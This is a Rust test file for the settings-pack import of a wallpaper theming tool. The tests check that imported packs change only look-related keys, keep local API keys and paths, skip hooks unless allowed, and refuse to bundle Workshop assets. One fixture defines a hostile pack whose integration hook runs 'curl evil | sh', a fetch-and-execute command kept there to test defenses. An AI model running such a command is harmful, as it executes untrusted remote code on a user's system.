#![cfg(test)]

use super::*;
use serde_json::json;

fn config_with_local_state() -> Config {
    Config::from_data(json!({
        "paths": {"wallpaper": "/home/me/pics", "paperVkBin": "/opt/skwd-wall-vk"},
        "monitor": "DP-1",
        "wallhaven": {"apiKey": "MY_REAL_KEY"},
        "steam": {"username": "me", "apiKey": "STEAMKEY"},
        "externalMatugenCommand": "matugen /home/me/cfg",
        "display": {"fillMode": "fill", "fillColor": "000000ff"},
        "matugen": {"schemeType": "scheme-fidelity"}
    }))
}

fn incoming_pack() -> Pack {
    let overlay = json!({
        "display": {"fillMode": "fit"},
        "matugen": {"schemeType": "scheme-vibrant", "colorIndex": 2},
        "paper": {"engine": "awww"},
        "wallhaven": {"apiKey": "ATTACKER_KEY"},
        "paths": {"wallpaper": "/attacker/pics"},
        "monitor": "ATTACKER-OUT",
        "integrations": [{"template": "t", "output": "/o", "reload": "curl evil | sh"}]
    });
    Pack::new("Incoming", "0.1.0", overlay)
}

#[test]
fn merge_look_keys_only() {
    let mut cfg = config_with_local_state();
    let pack = incoming_pack();
    let report = apply_import(&mut cfg, &pack, false, false);

    assert_eq!(cfg.str_path("display.fillMode"), "fit");
    assert_eq!(cfg.str_path("matugen.schemeType"), "scheme-vibrant");
    assert_eq!(cfg.str_path("paper.engine"), "awww");

    assert_eq!(cfg.root()["paths"]["wallpaper"], "/home/me/pics");
    assert_eq!(cfg.root()["monitor"], "DP-1");
    assert_eq!(cfg.root()["wallhaven"]["apiKey"], "MY_REAL_KEY");
    assert!(cfg.root().get("integrations").is_none());
    assert!(report.skipped_hooks >= 1);
    assert!(report.applied.iter().all(|key| pack::is_portable_key(key)));
}

#[test]
fn legacy_we_renderer_native() {
    for data in [
        json!({"weRender": {"engine": "auto"}}),
        json!({"weRender": {"engine": "compatibility"}}),
        json!({"weRender": {"native": false}}),
    ] {
        assert_eq!(
            Config::from_data(data).str_path(skwd_config::keys::we_render::ENGINE),
            "native"
        );
    }
}

#[test]
fn allow_hooks_no_secrets() {
    let mut cfg = config_with_local_state();
    let pack = incoming_pack();
    let report = apply_import(&mut cfg, &pack, false, true);
    assert_eq!(report.skipped_hooks, 0);
    assert!(cfg.root().get("integrations").is_some());
    assert_eq!(cfg.root()["wallhaven"]["apiKey"], "MY_REAL_KEY");
}

#[test]
fn replace_wipes_stale() {
    let mut cfg = Config::from_data(json!({
        "paths": {"wallpaper": "/home/me/pics"},
        "display": {"fillMode": "fill", "fillColor": "abcdefff"}
    }));
    let pack = Pack::new("R", "0.1.0", json!({"display": {"fillMode": "fit"}}));
    apply_import(&mut cfg, &pack, true, false);
    assert_eq!(cfg.str_path("display.fillMode"), "fit");
    assert!(cfg.root()["display"].get("fillColor").is_none());
    assert_eq!(cfg.root()["paths"]["wallpaper"], "/home/me/pics");
}

#[test]
fn import_unclassified_keys() {
    let mut cfg = Config::from_data(json!({
        "paths": {"wallpaper": "/home/me/pics"},
        "pickOnlyMode": false,
        "features": {"matugen": true},
        "display": {"fillMode": "fill"}
    }));
    let pack = Pack::new(
        "Hostile",
        "0.1.0",
        json!({
            "display": {"fillMode": "fit"},
            "pickOnlyMode": true,
            "features": {"matugen": false}
        }),
    );
    apply_import(&mut cfg, &pack, false, true);
    assert_eq!(cfg.str_path("display.fillMode"), "fit");
    assert_eq!(cfg.root()["pickOnlyMode"], false);
    assert_eq!(cfg.root()["features"]["matugen"], true);
}

#[test]
fn asset_kind_prefix() {
    assert_eq!(asset_kind("static:a.png"), "static");
    assert_eq!(asset_kind("video:c.mp4"), "video");
    assert_eq!(asset_kind("we:12345"), "we");
    assert_eq!(asset_kind("https://example.com/x.jpg"), "url");
}

#[test]
fn bundle_refuses_workshop() {
    let cfg = config_with_local_state();
    let dir = std::env::temp_dir().join(format!("skwd-bundle-{}", std::process::id()));
    let (asset, warnings) = bundle_asset(&cfg, "we:12345", &dir);
    assert!(asset.bundled.is_none());
    assert!(warnings.iter().any(|warning| warning.contains("Workshop")));
}
